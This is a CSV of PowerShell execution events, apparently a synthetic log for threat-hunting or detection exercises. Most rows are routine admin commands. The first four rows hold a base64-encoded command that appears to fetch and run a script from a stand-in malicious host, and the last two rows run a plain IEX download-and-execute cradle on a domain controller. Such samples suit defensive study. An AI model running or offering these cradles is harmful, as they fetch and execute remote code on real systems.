@timestamp,event_type,user,computer,command_executed,command_encoded,execution_status
2026-07-20T23:12:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
2026-07-20T23:14:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
2026-07-20T23:16:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
2026-07-20T23:18:00,powershell_execution,Admin,DESKTOP-ABC123,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQ==,True,success
2026-07-20T23:45:00,powershell_execution,SYSTEM,WORKSTATION-032,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T00:09:00,powershell_execution,jsmith,WORKSTATION-014,Restart-Service Spooler,False,success
2026-07-21T00:46:00,powershell_execution,svc_backup,WORKSTATION-035,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T01:02:00,powershell_execution,jsmith,WORKSTATION-020,Get-Process,False,success
2026-07-21T01:31:00,powershell_execution,admin,WORKSTATION-033,Get-Service,False,success
2026-07-21T02:08:00,powershell_execution,SYSTEM,WORKSTATION-001,Get-ChildItem C:\Logs,False,success
2026-07-21T02:23:00,powershell_execution,SYSTEM,WORKSTATION-021,Get-Service,False,success
2026-07-21T02:39:00,powershell_execution,svc_backup,WORKSTATION-024,Get-EventLog -LogName System -Newest 50,False,success
2026-07-21T02:52:00,powershell_execution,SYSTEM,WORKSTATION-005,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T03:20:00,powershell_execution,svc_backup,WORKSTATION-008,Get-Service,False,success
2026-07-21T03:46:00,powershell_execution,admin,WORKSTATION-017,Get-ChildItem C:\Logs,False,success
2026-07-21T03:56:00,powershell_execution,svc_backup,WORKSTATION-029,Restart-Service Spooler,False,success
2026-07-21T04:33:00,powershell_execution,jsmith,WORKSTATION-044,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T04:38:00,powershell_execution,SYSTEM,WORKSTATION-008,Get-Service,False,success
2026-07-21T04:50:00,powershell_execution,SYSTEM,WORKSTATION-006,Restart-Service Spooler,False,success
2026-07-21T04:56:00,powershell_execution,SYSTEM,WORKSTATION-048,Get-Process,False,success
2026-07-21T05:19:00,powershell_execution,svc_backup,WORKSTATION-009,Get-Process,False,success
2026-07-21T05:24:00,powershell_execution,jsmith,WORKSTATION-017,Get-EventLog -LogName System -Newest 50,False,success
2026-07-21T05:31:00,powershell_execution,SYSTEM,WORKSTATION-048,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T05:40:00,powershell_execution,SYSTEM,WORKSTATION-028,Restart-Service Spooler,False,success
2026-07-21T05:58:00,powershell_execution,admin,WORKSTATION-050,Get-Service,False,success
2026-07-21T06:33:00,powershell_execution,jsmith,WORKSTATION-045,Restart-Service Spooler,False,success
2026-07-21T06:47:00,powershell_execution,jsmith,WORKSTATION-036,Restart-Service Spooler,False,success
2026-07-21T07:08:00,powershell_execution,jsmith,WORKSTATION-015,Restart-Service Spooler,False,success
2026-07-21T07:42:00,powershell_execution,admin,WORKSTATION-003,Restart-Service Spooler,False,success
2026-07-21T07:56:00,powershell_execution,SYSTEM,WORKSTATION-012,Get-Service,False,success
2026-07-21T08:04:00,powershell_execution,jsmith,WORKSTATION-004,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T08:35:00,powershell_execution,admin,WORKSTATION-027,Get-Process,False,success
2026-07-21T09:08:00,powershell_execution,svc_backup,WORKSTATION-010,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T09:20:00,powershell_execution,admin,WORKSTATION-031,Get-Service,False,success
2026-07-21T09:44:00,powershell_execution,svc_backup,WORKSTATION-009,Get-EventLog -LogName System -Newest 50,False,success
2026-07-21T10:09:00,powershell_execution,svc_backup,WORKSTATION-037,Get-Service,False,success
2026-07-21T10:41:00,powershell_execution,jsmith,WORKSTATION-038,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T10:58:00,powershell_execution,jsmith,WORKSTATION-020,Get-Service,False,success
2026-07-21T11:30:00,powershell_execution,SYSTEM,WORKSTATION-044,Get-EventLog -LogName System -Newest 50,False,success
2026-07-21T11:47:00,powershell_execution,svc_backup,WORKSTATION-043,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T12:12:00,powershell_execution,SYSTEM,WORKSTATION-024,Get-ChildItem C:\Logs,False,success
2026-07-21T12:52:00,powershell_execution,svc_backup,WORKSTATION-024,Get-Process,False,success
2026-07-21T13:31:00,powershell_execution,SYSTEM,WORKSTATION-007,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T14:00:00,powershell_execution,admin,WORKSTATION-042,Get-Process,False,success
2026-07-21T14:39:00,powershell_execution,jsmith,WORKSTATION-040,Restart-Service Spooler,False,success
2026-07-21T15:14:00,powershell_execution,jsmith,WORKSTATION-050,Get-Service,False,success
2026-07-21T15:34:00,powershell_execution,svc_backup,WORKSTATION-009,Get-Service,False,success
2026-07-21T15:39:00,powershell_execution,SYSTEM,WORKSTATION-010,Get-Service,False,success
2026-07-21T15:59:00,powershell_execution,admin,WORKSTATION-045,Restart-Service Spooler,False,success
2026-07-21T16:37:00,powershell_execution,admin,WORKSTATION-007,Get-EventLog -LogName System -Newest 50,False,success
2026-07-21T17:06:00,powershell_execution,svc_backup,WORKSTATION-050,Get-Service,False,success
2026-07-21T17:31:00,powershell_execution,svc_backup,WORKSTATION-040,Get-EventLog -LogName System -Newest 50,False,success
2026-07-21T17:45:00,powershell_execution,jsmith,WORKSTATION-002,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T17:50:00,powershell_execution,svc_backup,WORKSTATION-050,Set-ExecutionPolicy RemoteSigned,False,success
2026-07-21T18:10:00,powershell_execution,jsmith,WORKSTATION-025,Get-ChildItem C:\Logs,False,success
2026-07-21T18:47:00,powershell_execution,SYSTEM,WORKSTATION-030,Get-Process,False,success
2026-07-21T19:23:00,powershell_execution,admin,WORKSTATION-025,Get-Process,False,success
2026-07-21T19:38:00,powershell_execution,jsmith,WORKSTATION-021,Get-ChildItem C:\Logs,False,success
2026-07-21T20:15:00,powershell_execution,jsmith,WORKSTATION-028,Get-Service,False,success
2026-07-21T20:46:00,powershell_execution,svc_backup,WORKSTATION-023,Get-Service,False,success
2026-07-21T21:22:00,powershell_execution,admin,WORKSTATION-034,Get-Process,False,success
2026-07-21T22:02:00,powershell_execution,admin,WORKSTATION-013,Get-Service,False,success
2026-07-21T22:09:00,powershell_execution,jsmith,WORKSTATION-002,Get-Process,False,success
2026-07-21T22:48:00,powershell_execution,admin,WORKSTATION-019,Get-ChildItem C:\Logs,False,success
2026-07-21T23:24:00,powershell_execution,svc_backup,WORKSTATION-041,Get-EventLog -LogName System -Newest 50,False,success
2026-07-21T23:58:00,powershell_execution,SYSTEM,WORKSTATION-007,Restart-Service Spooler,False,success
2026-07-22T00:28:00,powershell_execution,admin,WORKSTATION-007,Get-Process,False,success
2026-07-22T01:28:00,powershell_execution,admin,DC-01,IEX (New-Object Net.WebClient).DownloadString('https://internal-tools/patch.ps1'),False,success
2026-07-22T02:28:00,powershell_execution,admin,DC-01,IEX (New-Object Net.WebClient).DownloadString('https://internal-tools/patch.ps1'),False,success
